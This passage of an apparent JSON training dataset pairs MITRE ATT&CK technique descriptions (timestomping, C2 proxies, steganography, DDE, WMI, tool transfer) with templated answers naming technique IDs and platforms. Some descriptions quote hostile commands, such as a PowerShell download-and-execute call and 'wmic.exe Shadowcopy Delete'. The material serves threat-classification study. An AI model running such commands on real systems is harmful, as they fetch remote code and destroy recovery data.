      "answer": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: Timestomp (T1070.006);\nTechnique Indicator Removal: Timestomp (T1070.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: Timestomp (T1070.006);\nTechnique Indicator Removal: Timestomp (T1070.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Proxy: External Proxy (T1090.002);\nTechnique Proxy: External Proxy (T1090.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "answer": "The provided description is related to MITRE technique Proxy: External Proxy (T1090.002);\nTechnique Proxy: External Proxy (T1090.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Steganography (T1027.003);\nTechnique Obfuscated Files or Information: Steganography (T1027.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Steganography (T1027.003);\nTechnique Obfuscated Files or Information: Steganography (T1027.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.",
    "context": "",
    "output": "The provided description is related to MITRE technique Unsecured Credentials: Credentials In Files (T1552.001);\nTechnique Unsecured Credentials: Credentials In Files (T1552.001) is applicable to platforms: IaaS,  Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.",
      "answer": "The provided description is related to MITRE technique Unsecured Credentials: Credentials In Files (T1552.001);\nTechnique Unsecured Credentials: Credentials In Files (T1552.001) is applicable to platforms: IaaS,  Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "answer": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).",
    "context": "",
    "output": "The provided description is related to MITRE technique Inter-Process Communication: Dynamic Data Exchange (T1559.002);\nTechnique Inter-Process Communication: Dynamic Data Exchange (T1559.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).",
      "answer": "The provided description is related to MITRE technique Inter-Process Communication: Dynamic Data Exchange (T1559.002);\nTechnique Inter-Process Communication: Dynamic Data Exchange (T1559.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.\n\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.",
    "context": "",
    "output": "The provided description is related to MITRE technique Remote Services: VNC (T1021.005);\nTechnique Remote Services: VNC (T1021.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.\n\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.",
      "answer": "The provided description is related to MITRE technique Remote Services: VNC (T1021.005);\nTechnique Remote Services: VNC (T1021.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
      "answer": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
    "context": "",
    "output": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
      "answer": "The provided description is related to MITRE technique Screen Capture (T1113);\nTechnique Screen Capture (T1113) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
